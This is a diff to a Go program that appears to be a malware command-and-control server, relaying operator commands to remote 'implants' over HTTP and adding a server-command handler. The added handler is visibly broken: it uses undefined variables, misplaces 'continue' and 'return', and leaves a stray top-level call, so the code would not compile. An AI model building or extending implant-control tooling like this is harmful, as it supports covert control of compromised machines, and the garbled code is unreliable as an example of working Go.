@@ -61,6 +61,7 @@ func main() {
 func startServer() {
     http.HandleFunc("/implant", handleImplant)
     http.HandleFunc("/operator", handleOperator)
+    //http.HandleFunc("/info", handleServerCMDs)
     serverIP, err := getServerIP()
     if err != nil {
         log.Fatal("Error:", err)
@@ -108,7 +109,7 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     // Receive response
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-var idMask int
+    var idMask int
 	if uid != "" {
         // Check if the UID exists in the map
         var ok bool
@@ -187,6 +188,7 @@ var idMask int
 func handleOperator(w http.ResponseWriter, r *http.Request) {
     // Only allow POST requests
     operatorID := r.Header.Get("Operator-ID")
+
     implantIDStr := r.Header.Get("Implant-ID")
 
     implantID, err := strconv.Atoi(implantIDStr)
@@ -195,7 +197,7 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
         http.Error(w, "Invalid Implant-ID", http.StatusBadRequest)
         return
     }
-    
+
     fmt.Println("Received request from operator:", operatorID)
 
     if r.Method != http.MethodPost {
@@ -245,6 +247,52 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
     fmt.Fprintf(w, "Data: %s", response)
 
 }
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        // Server Commands
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
+    var receivestruct Command
+    // Trim leading and trailing whitespace
+    decodedData = bytes.TrimSpace(decodedData)
+   
+    err = json.Unmarshal(decodedData, &receivestruct)
+    if err != nil {
+        return fmt.Errorf("Failed to unmarshal JSON: %s", err)
+    }
+
+    fmt.Println("Cmd Group", receivestruct.Group)
+    fmt.Println("Cmd String:", receivestruct.String)
+    switch cmdGroup {
+    case "implant":
+        implantMgm()
+    default:
+        fmt.Print(red)
+        fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
+        fmt.Print(reset)
+        
+        continue
+    }
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Respond to operator        
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        
+    // Wait for the response from the implant
+    response := <-responseChan
+
+    // Write the response back to the client
+    w.Header().Set("Content-Type", "text/plain")
+    w.WriteHeader(http.StatusOK)
+    fmt.Fprintf(w, "Data: %s", response)
+}
+
+implantMgm()
+
+
+
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         // Helpers
